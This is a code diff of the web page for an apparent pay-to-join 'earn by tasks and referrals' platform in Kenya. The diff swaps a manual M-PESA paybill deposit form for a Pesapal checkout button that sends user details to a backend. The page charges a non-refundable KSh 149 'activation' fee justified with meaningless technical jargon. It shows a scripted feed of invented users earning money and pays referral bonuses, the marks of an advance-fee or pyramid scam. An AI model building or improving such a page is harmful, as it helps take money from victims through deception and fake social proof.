@@ -249,8 +249,7 @@
             display: inline-block;
         }
 
-        .bank-highlight { background: rgba(30, 41, 59, 0.5); padding: 16px; border-radius: 10px; margin-bottom: 18px; border-left: 4px solid #f59e0b; }
-        .maintenance-banner { background: rgba(127, 29, 29, 0.4); border: 1px solid #f87171; padding: 16px; border-radius: 10px; margin-bottom: 20px; color: #fca5a5; font-size: 0.9rem; }
+        .pesapal-highlight { background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); padding: 20px; border-radius: 12px; margin-bottom: 18px; border: 1px solid #334155; text-align: center; }
         
         /* Workflow State Visibility Enforcements */
         #activation { display: none; opacity: 0; transform: translateY(15px); }
@@ -491,22 +490,22 @@
         <button class="btn" onclick="registerUser()">Register Account</button>
     </div>
 
-    <!-- Activation Gateway -->
+    <!-- Activation Gateway (Pesapal API Integrated Replacement) -->
     <div id="activation" class="section">
-        <h2 style="color: #f59e0b;">Account Activation Payment Portal</h2>
+        <h2 style="color: #f59e0b;">Secure Payment Activation Node</h2>
         <p style="color: #94a3b8; font-size: 0.9rem; margin-top:-10px; margin-bottom:20px;">
-            Your database architecture requires verified token activation parameters to open market slots. Complete transaction below.
+            Your registration requires verified network token allocation metrics to authorize cloud task access loops. Click the link below to process instant verification via our integrated payment gateway.
         </p>
-        <div class="maintenance-banner"><strong>⚠️ Notice:</strong> Automatic STK gateway updates in progress. Use manual portal details below.</div>
-        <div class="bank-highlight">
-            <strong>Required Fee:</strong> KSh 149.00<br>
-            <strong>Paybill Code:</strong> 542542<br>
-            <strong>Account Number:</strong> 05609477496150
+        
+        <div class="pesapal-highlight">
+            <div style="font-size: 0.82rem; color: #64748b; text-transform: uppercase; font-weight: 700; letter-spacing: 1px;">Required Activation Total</div>
+            <div style="font-size: 2.2rem; font-weight: 900; color: #f59e0b; font-family: monospace; margin: 5px 0;">KSh 149.00</div>
+            <div style="font-size: 0.85rem; color: #94a3b8;">Supports: M-PESA STK Push, Airtel Money, Visa, or Mastercard</div>
         </div>
-        <div class="form-group"><label>Your Source Account/Phone</label><input type="text" id="bankAccountNum" class="form-input" placeholder="M-PESA Phone Number"></div>
-        <div class="form-group"><label>Amount Sent (KSh)</label><input type="number" id="bankAmount" class="form-input" value="149"></div>
-        <div class="form-group"><label>Transaction Reference Code</label><input type="text" id="bankRefCode" class="form-input" placeholder="e.g. QHB47RT89X"></div>
-        <button class="btn" style="background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);" onclick="submitBankDeposit()">Submit Verification Code</button>
+
+        <button class="btn" style="background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); font-size: 1.05rem; padding: 16px;" onclick="initiateLivePesapalPayment()">
+            🔒 Launch Secure Pesapal Checkout
+        </button>
     </div>
 
     <!-- Live Enterprise Metrics Dashboard Section -->
@@ -719,7 +718,7 @@
             <p>Users must provide authentic verification identification inputs including full name, communication address, and phone number parameters. Only one registration context layout is permitted per structural operational agent.</p>
             
             <h4>2. Account Verification & Activation Fees</h4>
-            <p>To initiate data parsing and active shares index tracking, profiles require a one-time registration fee of exactly KSh 149.00 to our designated Paybill core architecture. This activation deposit unlocks live tracking parameters and cannot be reversed or refunded once configuration blocks have changed state.</p>
+            <p>To initiate data parsing and active shares index tracking, profiles require an automated verification process totaling exactly KSh 149.00 via our integrated checkout merchant node. This activation deposit unlocks live tracking parameters and cannot be reversed or refunded once configuration blocks have changed state.</p>
             
             <h4>3. Daily Task and Question Allowances</h4>
             <p>Users are provided access to our operational question layout. A strict validation constraint permits processing exactly 7 questions daily per 24 hours, returning calculated credit metrics directly into the active wallet ledger balance.</p>
@@ -737,7 +736,7 @@
 </div>
 
 <script>
-const CONFIG = { fee: 149, keyphrase: "wizdev12" }; 
+const CONFIG = { fee: 149, keyphrase: "wizdev12", backend_url: "http://localhost:5000" }; 
 let currentSelectedHubPrice = 100;
 let isEarthingTerminalUnlocked = false;
 
@@ -757,7 +756,7 @@ const activities = [
     'Amina from Kisumu earned KSh 200 referral bonus.',
     'Sarah from Nakuru completed activation.',
     'Kevin from Mombasa joined AI networking.',
-    'John from Kampala shared with 5 people.',
+    'John from Meru shared with 5 people.',
     'Lisa from Eldoret earned KSh 500.',
     'Mercy from Embu activated successfully.',
     'Daniel from Thika earned KSh 1,200.'
@@ -908,7 +907,6 @@ function renderDisplay(user) {
         document.getElementById('lblBaseCost').innerText = `KSh ${user.allocatedSlot}.00`;
         document.getElementById('lblGrowthRate').innerText = `+KSh ${multiplier}.00 / Ref`;
         
-        // Dynamic Terminal Sync indicator light status switch
         const statusNode = document.getElementById('terminalStatusNode');
         if (statusNode) statusNode.innerHTML = '<div class="pulse-dot"></div><span>Market Track Active</span>';
     } else {
@@ -922,7 +920,6 @@ function renderDisplay(user) {
         if (statusNode) statusNode.innerHTML = '<div class="pulse-dot" style="background-color:#64748b; box-shadow:none;"></div><span style="color:#64748b;">Market Inactive</span>';
     }
 
-    // UPDATE ADMIN EARTHING MODULE (ONLY IF CRYPTO-DECRYPTED)
     if (isEarthingTerminalUnlocked) {
         document.getElementById('admUser').innerText = user.fullname ? `${user.fullname} (${user.phone})` : "No Registration Found";
         document.getElementById('admWallet').innerText = `KSh ${parseFloat(user.wallet).toFixed(2)}`;
@@ -933,11 +930,13 @@ function renderDisplay(user) {
 
 function registerUser(){
     const name = document.getElementById('fullname').value.trim();
+    const emailInput = document.getElementById('email').value.trim();
     if(!name) { alert('Please enter your full name input details.'); return; }
     if(!document.getElementById('terms').checked) { alert('You must review and agree to the platform Terms & Conditions to complete onboarding.'); return; }
     
     let u = fetchUser();
     u.fullname = name;
+    u.email = emailInput || "billing@broadconnections.com";
     u.phone = document.getElementById('phone').value.trim() || "00000000";
     u.referralCode = 'BC' + Math.floor(10000 + Math.random() * 90000);
     u.wallet = 0.00; 
@@ -951,22 +950,48 @@ function registerUser(){
     saveUser(u);
     
     showNotification('Registration successful ✅ Welcome onboard.');
-    alert('Profile initialized! The Activation Gateway has unlocked directly below.');
+    alert('Profile initialized! Use the automated checkout portal opened directly below.');
 }
 
-function submitBankDeposit() {
-    const amt = parseFloat(document.getElementById('bankAmount').value);
-    const ref = document.getElementById('bankRefCode').value.trim();
-    if(!ref || isNaN(amt)) { alert('Enter payment reference detail'); return; }
-    if(amt !== CONFIG.fee) { alert(`Deposit must equal KSh ${CONFIG.fee}`); return; }
-
+/* AUTOMATED API GATEWAY REDIRECT TRIGGER */
+function initiateLivePesapalPayment() {
     let u = fetchUser();
-    u.is_active = true;
-    u.wallet = parseFloat(u.wallet) + amt; 
-    saveUser(u);
-    
-    showNotification(`Payment Verified! KSh ${amt} credited.`);
-    alert(`Payment cleared! KSh ${amt} loaded to your asset core.`);
+    if (!u.fullname) {
+        alert("Please provide profile information layout variables first.");
+        return;
+    }
+
+    showNotification("Contacting server for secure checkouts... ⏳");
+
+    // Makes an asymmetric payload ping to your backend server application layer
+    fetch(`${CONFIG.backend_url}/api/initialize-payment`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            amount: CONFIG.fee,
+            phone: u.phone,
+            email: u.email,
+            name: u.fullname,
+            referenceId: 'REF-' + u.referralCode + '-' + Date.now()
+        })
+    })
+    .then(res => {
+        if (!res.ok) throw new Error("Gateway Node Response Denied");
+        return res.json();
+    })
+    .then(data => {
+        if (data.success && data.redirect_url) {
+            showNotification("Redirecting to transaction portal... 💳");
+            // Transfer user seamlessly to Pesapal standard checkout form
+            window.location.href = data.redirect_url;
+        } else {
+            alert("Payment handshake error: Check back-end credentials keys configuration status.");
+        }
+    })
+    .catch(err => {
+        console.error(err);
+        alert("Unable to establish gateway interface link. Confirm server.js is running active on Port 5000.");
+    });
 }
 
 function executeSurveySubmission() {
